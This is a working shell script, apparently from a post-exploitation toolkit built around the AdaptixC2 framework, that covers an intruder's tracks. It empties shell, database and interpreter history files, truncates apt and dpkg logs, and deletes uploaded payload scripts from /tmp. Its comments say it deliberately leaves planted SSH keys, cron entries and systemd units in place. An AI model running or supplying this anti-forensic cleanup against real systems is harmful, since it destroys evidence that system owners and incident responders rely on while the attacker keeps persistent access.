#!/bin/sh
# cleanup_traces.sh — remove execution traces left by an engagement.
#
# This script cleans HISTORY and temporary artefacts only. It deliberately does
# NOT touch persistence mechanisms (SSH keys, cron entries, systemd units) —
# use cleanup_persistence.sh for those.
#
# Usage:
#   cleanup_traces.sh [--dry-run] [--user root] [--keep-agent-payload]
#
# What it removes:
#   * shell history files (bash / zsh / sh / python / node)
#   * the uploaded AdaptixC2 script payloads in /tmp
#   * apt/dpkg command history
#
# What it never removes:
#   * authorized_keys entries
#   * /etc/cron.d entries
#   * systemd units and timers
#   * system logs owned by the OS

set -u

DRY_RUN=0
USER_NAME=""
KEEP_AGENT_PAYLOAD=0

log()  { printf '[cleanup-traces] %s\n' "$*"; }
fail() { printf '[cleanup-traces] ERROR: %s\n' "$*" >&2; exit 1; }

while [ $# -gt 0 ]; do
    case "$1" in
        --dry-run)             DRY_RUN=1; shift ;;
        --user)                USER_NAME="${2:-}"; shift 2 ;;
        --keep-agent-payload)  KEEP_AGENT_PAYLOAD=1; shift ;;
        --help|-h)             sed -n '2,20p' "$0"; exit 0 ;;
        *)                     fail "unknown argument: $1" ;;
    esac
done

if [ -z "$USER_NAME" ]; then
    USER_NAME="$(id -un 2>/dev/null || echo root)"
fi

HOME_DIR=""
if [ "$USER_NAME" = "root" ]; then
    HOME_DIR="${HOME:-/root}"
else
    HOME_DIR="$(getent passwd "$USER_NAME" 2>/dev/null | cut -d: -f6)"
    [ -n "$HOME_DIR" ] || fail "cannot resolve home directory for user '$USER_NAME'"
fi

run() {
    if [ "$DRY_RUN" -eq 1 ]; then
        printf '[cleanup-traces] DRY-RUN: %s\n' "$*"
    else
        "$@"
    fi
}

log "cleaning traces for user '$USER_NAME' (home: $HOME_DIR)"

# --- shell and interpreter history ----------------------------------------
for hist in \
    "$HOME_DIR/.bash_history" \
    "$HOME_DIR/.zsh_history" \
    "$HOME_DIR/.sh_history" \
    "$HOME_DIR/.ash_history" \
    "$HOME_DIR/.python_history" \
    "$HOME_DIR/.node_repl_history" \
    "$HOME_DIR/.psql_history" \
    "$HOME_DIR/.mysql_history" \
    "$HOME_DIR/.rediscli_history" \
    "$HOME_DIR/.lesshst" \
    "$HOME_DIR/.viminfo" \
    "$HOME_DIR/.wget-hsts"
do
    if [ -f "$hist" ]; then
        log "clearing history file $hist"
        run sh -c ": > '$hist'"
    fi
done

# --- apt / dpkg history ----------------------------------------------------
for hist in /var/log/apt/history.log /var/log/apt/term.log /var/log/dpkg.log; do
    if [ -f "$hist" ]; then
        log "truncating package manager log $hist"
        run sh -c ": > '$hist'"
    fi
done

# --- uploaded AdaptixC2 script payloads ------------------------------------
if [ "$KEEP_AGENT_PAYLOAD" -eq 0 ]; then
    for f in /tmp/.adaptix-*.sh; do
        [ -f "$f" ] || continue
        log "removing uploaded script $f"
        run rm -f "$f"
    done
else
    log "keeping uploaded script payloads (--keep-agent-payload)"
fi

# --- common temporary drop directories -------------------------------------
for d in /tmp/.adaptix /tmp/.cache/adaptix; do
    if [ -d "$d" ]; then
        log "removing temporary directory $d"
        run rm -rf "$d"
    fi
done

log "trace cleanup finished (persistence mechanisms were NOT touched)"
exit 0
